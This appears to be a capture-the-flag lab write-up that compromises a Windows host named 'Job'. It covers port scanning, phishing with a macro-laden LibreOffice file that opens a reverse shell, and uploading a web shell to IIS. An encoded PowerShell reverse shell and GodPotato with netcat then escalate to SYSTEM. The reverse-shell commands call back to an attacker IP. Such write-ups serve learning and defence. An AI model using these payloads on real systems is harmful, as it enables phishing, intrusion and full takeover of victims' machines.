

## Lab Details
- Difficulty: Medium
- OS: Windows

## Summary
- Initial access: Phishing 
- Privilege escalation: Excessive Permission, `SEImpersonate`

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.193.115 -sC -sV -A -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-06 23:12 EDT
Nmap scan report for 10.129.193.115
Host is up (0.0049s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: JOB, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Job.local
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-07T03:16:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=job
| Not valid before: 2026-06-06T03:11:48
|_Not valid after:  2026-12-06T03:11:48
| rdp-ntlm-info: 
|   Target_Name: JOB
|   NetBIOS_Domain_Name: JOB
|   NetBIOS_Computer_Name: JOB
|   DNS_Domain_Name: job
|   DNS_Computer_Name: job
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-07T03:15:42+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: JOB; OS: Windows; CPE: cpe:/o:microsoft:windows

```
- Visit port 80 and we are presented with a message 
![[Pasted image 20260607112006.png]]

## Foothold

#### Steps
- From the message on port 80 we can tell that a user might click on CV attach to emails 
- Since the requirement file type is `libre office` we will download `MMG-LO` to generate a file with malicious macro that will give us reverse shell 
```
$ git clone https://github.com/0bfxgh0st/MMG-LO.git
```
- Create malicious office file
```
$ python3 mmg-odt.py windows 10.10.14.18 4444
[+] Payload: windows reverse shell
[+] Creating malicious .odt file

Done.
```

```
$ ls
file.odt  mmg-odb.py  mmg-odg.py  mmg-odp.py  mmg-ods.py  mmg-odt.py  README.md
```
- Send email to target with malicious office file attached
```
$ swaks --to career@job.local  --from john@gmail.com \
  --header "Subject: Job application" \
  --body "Hi I would like to work for you, my CV is attached." \
  --attach @/home/kali/Downloads/tools/MMG-LO/file.odt \
  --server 10.129.193.115
=== Trying 10.129.193.115:25...
=== Connected to 10.129.193.115.
<-  220 JOB ESMTP
 -> EHLO k.localdomain
<-  250-JOB
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<john@gmail.com>
<-  250 OK
 -> RCPT TO:<career@job.local>
<SNIP>
```
- We will get a shell access as user `jack.black`
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.193.115] 64093

PS C:\Program Files\LibreOffice\program>whoami
job\jack.black
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- The user belongs to a custom group called `developers`
- Download `accesschk.exe` and move to target
- Remember that port 80 runs a web app, use `accesschk.exe` to check if we have access to the web app home directory 
```
PS C:\temp> wget http://10.10.14.18:8000/accesschk.exe -o ./accesschk.exe

PS C:\> C:\temp\accesschk.exe -d "developers" "C:\inetpub" -s
C:\temp\accesschk.exe -d "developers" "C:\inetpub" -s

Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

   C:\inetpub
   C:\inetpub\custerr
   C:\inetpub\DeviceHealthAttestation
C:\inetpub\history
  Error getting security:
  Access is denied.

C:\inetpub\logs
  Error getting security:
  Access is denied.

   C:\inetpub\temp
RW C:\inetpub\wwwroot
   C:\inetpub\custerr\en-US
   C:\inetpub\DeviceHealthAttestation\bin
C:\inetpub\temp\appPools
  Error getting security:
  Access is denied.

C:\inetpub\temp\ASP Compiled Templates
  Error getting security:
  Access is denied.

C:\inetpub\temp\IIS Temporary Compressed Files
  Error getting security:
  Access is denied.

   C:\inetpub\wwwroot\aspnet_client
RW C:\inetpub\wwwroot\assets
RW C:\inetpub\wwwroot\css
RW C:\inetpub\wwwroot\js
   C:\inetpub\wwwroot\aspnet_client\system_web
   C:\inetpub\wwwroot\aspnet_client\system_web\2_0_50727
   C:\inetpub\wwwroot\aspnet_client\system_web\4_0_30319
RW C:\inetpub\wwwroot\assets\img
RW C:\inetpub\wwwroot\assets\img\portfolio
RW C:\inetpub\wwwroot\assets\img\portfolio\fullsize
RW C:\inetpub\wwwroot\assets\img\portfolio\thumbnails
```
- We have read and write access to the web app's home directory 
```
PS C:\inetpub\wwwroot> icacls .
icacls .
. JOB\developers:(OI)(CI)(F)
  BUILTIN\IIS_IUSRS:(OI)(CI)(RX)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```
- We can place a web shell to the home directory 
```
PS C:\inetpub\wwwroot> wget http://10.10.14.18:8000/web_shell.aspx -o ./web_shell.aspx
```

![[Pasted image 20260607123759.png]]
- Inject a reverse shell payload 
```
/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA4ACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```
- Receive a shell as user `iss apppool` which has `SeImpersonatePrivilege` Token available 
```
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.193.115] 64103

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> whoami /all

USER INFORMATION
----------------

User Name                  SID
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
- Download `nc64` and `godpotato` to get a shell as `nt authority \ system`
```
PS C:\temp> wget http://10.10.14.18:8000/nc64.exe -o nc64.exe
PS C:\temp> wget http://10.10.14.18:8000/GodPotato-NET4.exe -O GodPotato.exe
PS C:\temp> ./GodPotato.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140734489362432
[*] DispatchTable: 0x140734491949384
[*] UseProtseqFunction: 0x140734491242688
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\87d12537-6e32-478e-8a66-72f33e523966\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000ac02-16d4-ffff-be5a-c1181843f84e
[*] DCOM obj OXID: 0xf86724c82d173981
[*] DCOM obj OID: 0xeb4b0857b597f23c
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 880 Token:0x760  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 7164
nt authority\system
PS C:\temp> ./GodPotato.exe -cmd "C:\temp\nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.18 7777"
```

```
$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.193.115] 64111
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\temp>whoami
whoami
nt authority\system
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: